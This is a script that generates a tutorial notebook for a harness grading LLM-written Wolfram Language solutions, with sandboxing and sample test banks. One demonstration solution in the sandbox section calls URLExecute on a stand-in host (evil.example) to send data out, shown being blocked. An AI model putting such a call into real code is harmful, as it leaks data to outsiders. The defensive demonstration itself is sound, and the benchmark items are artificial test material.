#!/usr/bin/env wolframscript
(* ::Package:: *)

(* Generate docs/Tutorial.nb from a programmatic spec.

   The tutorial is rebuilt by this script, not hand-edited, so the
   notebook stays in sync with the paclet and the JSONL format. The
   spec below is an ordered list of {style, content} pairs (or
   {"Input", code} for runnable cells). The script wraps them in
   Cell[...] expressions and writes the resulting Notebook[{...}]
   object to docs/Tutorial.nb.

   Usage:
     wolframscript -file scripts/BuildTutorial.wls
*)

$scriptDir = DirectoryName[$InputFileName];
$repoRoot  = DirectoryName[$scriptDir];
$out       = FileNameJoin[{$repoRoot, "docs", "Tutorial.nb"}];

(* ----------------------------------------------------------------------- *)
(* Cell builders                                                           *)
(* ----------------------------------------------------------------------- *)

(* Plain prose / heading cells. *)
prose[style_String, body_String] :=
  Cell[body, style];

(* Input cells. The user can shift-Enter through them in Mathematica.
   We mark them Initialization -> True so the doc-builder can also
   evaluate them as a smoke test if needed. *)
input[code_String] :=
  Cell[BoxData @ code, "Input", InitializationCell -> True];

(* Inline-code styled prose: monospaced font for short snippets. *)
codeProse[body_String] := Cell[body, "Code"];


(* ----------------------------------------------------------------------- *)
(* Tutorial body                                                           *)
(* ----------------------------------------------------------------------- *)

cells = {
  prose["Title", "WolframChallengesBenchmark \[LongDash] Tutorial"],

  prose["Text",
    "End-to-end walkthrough for grading LLM-generated Wolfram Language \
solutions with the WolframChallengesLLMBenchmarkPaclet harness: load \
the canonical bank, run a model's solutions under sandboxed isolation, \
inspect typed results, render reports (HTML / Markdown / JSON / JUnit \
XML), audit a solutions directory, author your own challenges via the \
single-file JSONL format or .wlchallenge files, and compare two runs."],

  prose["Text",
    "Every example below runs in-process against a tiny synthetic bank \
so you can follow along without a pre-existing solutions directory \
or a network connection. The tutorial is regenerated by \
scripts/BuildTutorial.wls; edit that script (not this notebook) to \
keep changes reproducible."],

  prose["Section", "1. Load the paclet"],

  prose["Text",
    "The harness ships as a regular Wolfram paclet under \
WolframChallengesLLMBenchmarkPaclet/. PacletDirectoryLoad makes its \
public symbols visible without a system-wide install, so you can run \
the tutorial directly from a fresh clone."],

  input["$repoRoot = If[$Notebooks,\n\
    FileNameDrop[NotebookDirectory[], -1],\n\
    Directory[]];\n\
PacletDirectoryLoad[FileNameJoin[{$repoRoot, \"WolframChallengesLLMBenchmarkPaclet\"}]];\n\
Needs[\"JofreEspigulePons`WolframChallengesBenchmark`\"];"],

  prose["Text",
    "The public surface clusters into four groups:"],

  prose["Item",
    "Loaders \[LongDash] LoadChallengesJSONL (the canonical single-file \
loader), LoadChallenges + LoadTestBank (legacy back-compat), \
LoadSolutions, ReconcileNames."],

  prose["Item",
    "Generation + audit \[LongDash] GenerateSolutions, \
OpenRouterChatComplete, ExtractCode, SaveSolution, AuditSolutions."],

  prose["Item",
    "Runner + reports \[LongDash] RunBenchmark, DiffRuns, WriteReport, \
WriteJUnitReport, LiveDashboard."],

  prose["Item",
    "Authoring \[LongDash] LoadWLChallenge, LoadChallengesDir, \
BuildTestBank, BuildChallengesJSONL, WriteTestBankFiles, \
WriteWLChallengeDir."],

  prose["Section", "2. Inspect the canonical bank"],

  prose["Text",
    "The bank lives in challenges.jsonl as one JSON record per line \
(HumanEval-shaped). Load it via LoadChallengesJSONL, which returns an \
Association with two keys: \"challenges\" (Association of task_id -> \
metadata) and \"testBank\" (Association of task_id -> list of typed \
test entries with held inputs)."],

  input["data       = LoadChallengesJSONL[FileNameJoin[{$repoRoot, \"challenges.jsonl\"}]];\n\
challenges = data[\"challenges\"];\n\
testBank   = data[\"testBank\"];\n\
Length[challenges]"],

  prose["Text",
    "Pick one challenge to inspect:"],

  input["challenges[\"FizzBuzz\"]"],

  input["testBank[\"FizzBuzz\"]"],

  prose["Section", "3. Build a tiny synthetic bank"],

  prose["Text",
    "For the rest of the tutorial we'll work with a small in-memory bank so \
the examples run in milliseconds. The shape mirrors what \
LoadChallengesJSONL returns."],

  input["miniChallenges = <|\n\
  \"AddTwo\" -> <|\"name\" -> \"AddTwo\", \"prompt\" -> \"Define addTwo[a,b]\"|>,\n\
  \"Square\" -> <|\"name\" -> \"Square\", \"prompt\" -> \"Define sq[x]\"|>\n\
|>;\n\
miniBank = <|\n\
  \"AddTwo\" -> {\n\
    <|\"challengeName\" -> \"AddTwo\",\n\
      \"input\"    -> HoldComplete[addTwo[2, 3]],\n\
      \"expected\" -> 5, \"metadata\" -> <||>|>,\n\
    <|\"challengeName\" -> \"AddTwo\",\n\
      \"input\"    -> HoldComplete[addTwo[10, 20]],\n\
      \"expected\" -> 30, \"metadata\" -> <||>|>},\n\
  \"Square\" -> {\n\
    <|\"challengeName\" -> \"Square\",\n\
      \"input\"    -> HoldComplete[sq[4]],\n\
      \"expected\" -> 16, \"metadata\" -> <||>|>}\n\
|>;\n\
{Length[miniChallenges], Total[Length /@ Values[miniBank]]}"],

  prose["Section", "4. Run a model under the sandbox"],

  prose["Text",
    "RunBenchmark takes the challenges, the test bank, and a solutions \
Association of task_id -> <|\"code\" -> sourceString|>. We'll hand it a \
correct solution for AddTwo and a deliberately broken one for Square \
to see both outcomes."],

  input["miniSolutions = <|\n\
  \"AddTwo\" -> <|\"code\" -> \"addTwo[a_, b_] := a + b\"|>,\n\
  \"Square\" -> <|\"code\" -> \"sq[x_] := First[{}]\"|>  (* deliberately bad *)\n\
|>;\n\
$tmp = FileNameJoin[{$TemporaryDirectory, \"wclb-tutorial-\" <> ToString[RandomInteger[10^9]]}];\n\
run = RunBenchmark[\n\
  miniChallenges, miniBank, miniSolutions,\n\
  \"Model\"           -> \"tutorial-demo\",\n\
  \"OutputDirectory\" -> $tmp,\n\
  \"IsolationMode\"   -> \"InProcess\",\n\
  \"TimeConstraint\"  -> 5];\n\
run[\"meta\", \"summary\"]"],

  prose["Text",
    "InProcess is the fastest isolation mode (no subkernel spinup) and \
fine for trusted, well-behaved code. Use \"PerTestKernel\" or \
\"PooledKernels\" when grading untrusted LLM output \[LongDash] those \
modes contain Aborts, Quits, infinite loops, and OOMs in a child \
kernel so a bad solution can't take the driver down."],

  prose["Text",
    "The per-test typed results live in run[\"results\"]. Each entry is \
an Association with status, passed, durationSec, expected, actualOutput, \
messageCount, and error fields."],

  input["#[[1]] -> #[[2]] & @@@ ({#[\"testId\"], #[\"status\"]} & /@ run[\"results\"])"],

  input["First @ Select[run[\"results\"], #[\"passed\"] === False &]"],

  prose["Section", "5. Render reports"],

  prose["Text",
    "WriteReport emits an HTML, Markdown, JSON, and JUnit XML view of \
the run into a directory. The JUnit XML maps Evaluated+passed -> bare \
testcase, Evaluated+failed -> failure, NoSolution -> skipped, and \
everything else -> error \[LongDash] ready for any CI's test-report \
ingestion."],

  input["paths = WriteReport[run, run[\"runDir\"]];\n\
Column[Values[paths]]"],

  prose["Text",
    "Open the HTML in a browser:"],

  input["SystemOpen[paths[\"html\"]]"],

  prose["Section", "6. Sandbox the LLM-generated code"],

  prose["Text",
    "LLM output is untrusted. The runner's sandbox Block-binds dangerous \
operators to a sentinel that returns $Failed without side effects \[LongDash] \
URLExecute, OpenWrite, Run, ToExpression, etc. Try grading a candidate \
that calls URLExecute and watch the sandbox swallow the side effect:"],

  input["sandboxed = RunBenchmark[\n\
  <|\"Exfil\" -> <|\"name\" -> \"Exfil\", \"prompt\" -> \"f\"|>|>,\n\
  <|\"Exfil\" -> {<|\"challengeName\" -> \"Exfil\",\n\
                    \"input\" -> HoldComplete[f[1]],\n\
                    \"expected\" -> 1, \"metadata\" -> <||>|>}|>,\n\
  <|\"Exfil\" -> <|\"code\" -> \"f[x_] := URLExecute[\\\"https://evil.example/\\\" <> ToString[x]]\"|>|>,\n\
  \"Model\"           -> \"tutorial-sandbox\",\n\
  \"OutputDirectory\" -> $tmp,\n\
  \"IsolationMode\"   -> \"InProcess\",\n\
  \"Sandbox\"         -> True,\n\
  \"TimeConstraint\"  -> 5];\n\
First[sandboxed[\"results\"]][\"actualOutput\"]"],

  prose["Section", "7. Audit a solutions directory"],

  prose["Text",
    "Before a long benchmark run, AuditSolutions confirms each \
.wl file in solutions/<model>/ defines the function the test bank \
expects. Parsing is held \[LongDash] AuditSolutions never evaluates \
candidate code."],

  input["solDir = FileNameJoin[{$tmp, \"audit-demo\"}];\n\
CreateDirectory[solDir];\n\
Export[FileNameJoin[{solDir, \"AddTwo.wl\"}],\n\
  \"someOtherFn[x_] := x^2\", \"Text\"];\n\
audit = AuditSolutions[solDir, miniBank];\n\
audit[\"ok\"]"],

  input["audit[\"mismatches\"]"],

  prose["Section", "8. Author your own challenge"],

  prose["Text",
    "Two authoring paths are supported. For a one-off, append a JSONL \
line to challenges.jsonl directly. For structured editing, write \
.wlchallenge files (see docs/WLCHALLENGE-FORMAT.md) and run \
BuildChallengesJSONL to refresh the bank."],

  input["StringTake[\n\
  ExportString[\n\
    <|\"task_id\" -> \"ReverseList\",\n\
      \"name\" -> \"ReverseList\",\n\
      \"index\" -> 167,\n\
      \"instruction\" -> \"Write Wolfram Language code...\",\n\
      \"prompt\" -> \"Reverse a list\\nDefine reverseList[lst].\",\n\
      \"entry_point\" -> \"reverseList\",\n\
      \"tests\" -> {\n\
        <|\"input_wl\" -> \"reverseList[{1, 2, 3}]\",\n\
          \"expected_wl\" -> \"{3, 2, 1}\",\n\
          \"metadata\" -> <||>|>}|>,\n\
    \"RawJSON\", \"Compact\" -> True],\n\
  120] <> \"...\""],

  prose["Text",
    "End-to-end authoring with .wlchallenge files:"],

  codeProse[
    "wolframscript -file scripts/BuildChallengesJSONL.wls --in .challenges"],

  prose["Section", "9. Compare two runs"],

  prose["Text",
    "DiffRuns is the per-test diff between two runs of the same bank \
(by testId). CompareModels takes a list (or Association) of run \
directories and returns a per-challenge pass-rate matrix. Both surface \
regressions, fixes, and \"only this model passes\" / \"only this model \
fails\" buckets."],

  input["solGood = <|\"AddTwo\" -> <|\"code\" -> \"addTwo[a_, b_] := a + b\"|>|>;\n\
solBad  = <|\"AddTwo\" -> <|\"code\" -> \"addTwo[a_, b_] := a * b\"|>|>;\n\
runGood = RunBenchmark[miniChallenges, miniBank, solGood,\n\
  \"Model\" -> \"good\", \"OutputDirectory\" -> $tmp,\n\
  \"IsolationMode\" -> \"InProcess\", \"TimeConstraint\" -> 5];\n\
runBad  = RunBenchmark[miniChallenges, miniBank, solBad,\n\
  \"Model\" -> \"bad\",  \"OutputDirectory\" -> $tmp,\n\
  \"IsolationMode\" -> \"InProcess\", \"TimeConstraint\" -> 5];\n\
diff = DiffRuns[runGood, runBad];\n\
diff[\"summary\"]"],

  input["diff[\"regressions\"]"],

  prose["Section", "10. CLI workflow"],

  prose["Text",
    "Everything in this notebook has a CLI counterpart in scripts/. \
The minimal model run from the command line:"],

  codeProse[
    "wolframscript -file scripts/RunBenchmark.wls \\\n  \
--solutions solutions/claude-opus-4.6 \\\n  \
--model     claude-opus-4.6"],

  prose["Text",
    "scripts/RunBenchmark.wls reads challenges.jsonl from the current \
directory by default; pass --jsonl path/to/challenges.jsonl to \
override. See scripts/RunBenchmark.wls --help for the full flag set \
(filtering, parallelism, sandbox toggle, baseline diff, fail-under \
threshold, JUnit override)."],

  prose["Section", "11. Continuous integration"],

  prose["Text",
    ".github/workflows/tests.yml runs the paclet's VerificationTest \
suite on every push and pull request, plus a bank-self-test job that \
runs the canonical reference solutions against their own tests as a \
regression gate. See docs/ci-setup.md for the self-hosted runner setup \
and the (commented-out) Wolfram Engine Docker alternative."],

  prose["Section", "Where to next"],

  prose["Item", "docs/CHALLENGES-JSONL-FORMAT.md \[LongDash] full schema spec for challenges.jsonl + worked-example tutorial."],

  prose["Item", "docs/WLCHALLENGE-FORMAT.md \[LongDash] grammar for the plain-text .wlchallenge authoring format."],

  prose["Item", "docs/ci-setup.md \[LongDash] runner setup, environment variables, optional Docker path."],

  prose["Item", "WolframChallengesLLMBenchmarkPaclet/Documentation/English/ReferencePages/Symbols/ \[LongDash] per-symbol reference docs."]
};


(* ----------------------------------------------------------------------- *)
(* Emit the notebook                                                       *)
(* ----------------------------------------------------------------------- *)

If[! DirectoryQ[DirectoryName[$out]],
  CreateDirectory[DirectoryName[$out], CreateIntermediateDirectories -> True]];

nb = Notebook[cells,
  StyleDefinitions -> "Default.nb",
  WindowTitle      -> "WolframChallengesBenchmark Tutorial"];

Put[nb, $out];

WriteString[$Output,
  "Wrote ", $out, "  (", Length[cells], " cells, ",
  Round[N @ FileByteCount[$out] / 1024, 0.1], " KB)\n"];
Exit[0]
